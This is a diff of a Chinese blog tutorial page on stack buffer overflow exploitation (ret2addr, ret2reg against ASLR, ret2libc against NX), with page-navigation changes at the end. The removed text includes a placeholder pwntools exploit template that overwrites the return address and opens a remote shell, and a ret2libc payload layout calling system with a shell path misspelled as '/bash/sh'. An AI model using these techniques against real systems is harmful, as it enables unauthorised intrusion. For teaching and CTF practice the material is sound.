-<p>低  临时变量3 EBP-xxx<br>↓↓  临时变量2 EBP-xxx<br>↓↓  临时变量1 EBP-xxx<br>↓↓  &lt;——EBP<br>↓↓  EBP原值<br>↓↓  EIP原值<br>↓↓  参数1<br>↓↓  参数2<br>高  参数3</p>
-</blockquote>
-<blockquote>
-<p>内存的操作数据的存放顺序是反过来的哦</p>
-</blockquote>
-<p>这一种存储方式虽然高效但是会有一个致命的弱点，那就是内存中临时变量被溢出会把EIP盖掉，导致程序流就会走向你想要的任何地方（前提是没开canary等等的保护，绕过它们的方法以后会写）。</p>
-<p>所以你需要知道shellcode在哪儿，才能精确的跳转至shellcode。这也就是为什么这种技术被称为热ret2addr。一般来说我们会在盖掉EIP的时候顺便在下面写下shellcode所以这个地址我们一般也是知道的。</p>
-<p>在进行这种溢出的过程中我们一般需要确认EIP的地址才可以进行精准的覆盖，不至于让我们的程序滑到谁也不知道的地方去。</p>
-<h3 id="EIP的定位"><a href="#EIP的定位" class="headerlink" title="EIP的定位"></a>EIP的定位</h3><p>有两种方法：<br>1.不停地向新开的程序里丢大小不同的垃圾最后当程序因为异常退出时就可以知道EIP的地址了。<br>2.通过ida看当前栈帧里的内容决定丢多少垃圾进去。<br>有些情况下会发生栈帧很大导致难以试出EIP或者ida分析不出的情况，可以考虑我的另一篇博客的所写的gdb-peda中的pattern大法。</p>
-<h3 id="exp的写法"><a href="#exp的写法" class="headerlink" title="exp的写法"></a>exp的写法</h3><p>通用模板</p>
-<pre><code># -*- coding:utf-8 -*-
-from pwn import *
-
-sh = remote(&quot;????&quot;,????) # 与服务器交互
-junk = &apos;a&apos;*0x?? # 填充
-fakebp = &apos;a&apos;*8# 淹没bp
-syscall = ?????????????
-payload = junk + fakebp + p64(syscall) # p64对整数进行打包
-sh.send(payload)
-sh.interactive() # 直接反弹shell进行交互
-</code></pre><blockquote>
-<p>更改？？？？？的内容就可以了。</p>
-</blockquote>
-<hr>
-<h2 id="return-to-register-绕过aslr"><a href="#return-to-register-绕过aslr" class="headerlink" title="return-to-register(绕过aslr)"></a>return-to-register(绕过aslr)</h2><p>虽然说我们上文的技术十分有效，但是魔高一尺，道高一丈，安全技术人员发明了aslr技术对程序进行保护使得偏移量甚至达到2g，这让我们难以确认shellcode的真正位置。</p>
-<blockquote>
-<p>aslr在linux系统上是一个编译选项而非像windows一样是一个链接选项。linux的alsr安全性高于windwos，但是会拖累程序的运行速度，所以aslr在linux上并非很普遍。</p>
-</blockquote>
-<blockquote>
-<p>因为alsr会把栈的基址与栈帧随机掉，那么我们就不知道我们的shellcode会随机到哪里去了。而且确认EIP位置也成了一大难题，因为栈帧的变动会导致EIP变动。</p>
-</blockquote>
-<p>但是真正的黑客从不畏惧艰难，勇于向不可能发起挑战，他们发明了ret2reg技术（当然nop-slide之类的技术也可以做到）</p>
-<blockquote>
-<p>当然aslr+pie依然可以干掉这些大胆的黑客，当然这就是后话了。<br>IDE的优化也可以，（笑</p>
-</blockquote>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>系统中的某一些函数会将当前栈帧的地址暴露出来，尤其是处理字符串等。有些情况下会把地址暴露到寄存器中。那么我们在写入shellcode后可以通过寄存器定位，然后在EIP中跳到寄存器位置加上相对偏移。</p>
-<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>如果你一步步按这个方法进行操作的话，你会碰到一个问题。你需要进行</p>
-<pre><code>call xxx
-//jump xxx
-</code></pre><p>但是它们在哪呢，我应该怎么样在程序中EIP中填写地址才能跳到那儿呢。aslr有一个特点可以帮助我们解决这个问题，那就是</p>
-<blockquote>
-<p>前文提到使用 echo 2 &gt; /proc/sys/kernel/randomize_va_space 命令将地址混淆技术启用，但该技术对栈空间，堆地址和动态库加载空间都进行了混淆，唯独没有对程序做地址混淆。<br>事实上Linux gcc编译器提供了-fPIE选项，但用它来编译，可使程序空间做地址混淆，造成整个进程地址混淆。但一般的开源软件和商用Linux发行商的服务进程并没有使用-fPIE进行安全增加，还是留下了可利用空间。注意到， stack2在编译时没有使用-fPIE选项。</p>
-</blockquote>
-<p>我们可以通过objdump和grep命令来寻找call xxx相关的指令，然后在EIP中覆写这个地址，然后想办法把shellcode放到寄存器所在的地址去。然后就成功了。</p>
-<h3 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h3><p>如果程序中的寄存器指的地方你覆写不了（比如说在溢出点上面），或者下面的程序修改了这个寄存器的值，那这个方法就无能为力了。</p>
-<hr>
-<h2 id="return-to-libc-绕过NX"><a href="#return-to-libc-绕过NX" class="headerlink" title="return to libc(绕过NX)"></a>return to libc(绕过NX)</h2><h3 id="数据执行保护"><a href="#数据执行保护" class="headerlink" title="数据执行保护"></a>数据执行保护</h3><p>在linux环境下所说的NX与windows平台下的DEP是同一个东西，即数据执行保护。</p>
-<p>其功能为通过将非代码段的代码设为不可执行，从而避免程序流被劫持到堆栈等位置的shellcode中。一旦EIP移动到非代码段中，CPU就会报异常，然后杀死这个进程。</p>
-<p>在64位系统上，这个防护的实现主要通过内存页上的NX位。在windows环境下的32位系统则通过软件模拟的方式实现了这一防护。而linux的32位操作系统则没有这样的防护可以选择.</p>
-<blockquote>
-<p>微软在windows XP系统上首先实现了这一防护。<br>此外这一机制在windows上一般被称为DEP，而在linux上被称作NX。</p>
-</blockquote>
-<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>虽然非代码段代码无法正常执行，但是我们可以把代码注入到现成的代码段。我们可以通过调用libc中的system函数来实现我们之前的shellcode中的功能。根据32位函数调用的规范，它会将堆栈中的数据当成参数。而堆栈的更改可以通过溢出等方式来实现（如果开了金丝雀防护的话需要从长计议）。</p>
-<blockquote>
-<p>在linux中使用了libc的加强版本glibc。</p>
-</blockquote>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为我们需要伪造一个调用</p>
-<p>所以我们的payload是A*n + system地址（对应EIP） + 返回地址 + “/bash/sh”(参数)</p>
-<p>首先通过pattern生成一个足够大的字符串，定位EIP的位置与A的数量，这都是老生常谈的了。但是我们这次需要查看转储的核心文件core。</p>
-<p>我们通过<code>p system</code></p>
-<p>暴露出libc中system函数的位置。</p>
-<p>当然，如果你想要避免程序的非正常退出（瞎填的EIP使程序走向了奇怪的位置），你也可以在返回地址中填入exit的地址。</p>
-<p>方法为<code>p exit</code></p>
-<blockquote>
-<p>巧妙地设计甚至可以绕过aslr因为不再需要定位shellcode。</p>
-</blockquote>
-<h3 id="局限-1"><a href="#局限-1" class="headerlink" title="局限"></a>局限</h3><p>如果你使用过这个方法的话，你就会发现这个方法是行不通的，因为现在有了一种新的保护机制叫做ASCII armoring来对抗ret2libc，它把libc中所有的地址的第一个字节都设为零，这就导致了在溢出时溢出内容会被截断，而开了NX以后又无法使用shellcode来绕过这一个限制。</p>
-<hr>
-<p>本来应该在之后根据ASCII armoring的弱点讲ret2plt，但是在这之前还需要补充很多知识，才可以继续。故将新开一篇文章来对glibc中的一些特性进行讲解。</p>
 
     
 
@@ -696,19 +646,19 @@ sh.interactive() # 直接反弹shell进行交互
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/06/14/实用小工具/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
+    
+        <a href="/2018/06/14/pwn的小知识的杂记/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
     
 </nav>
 
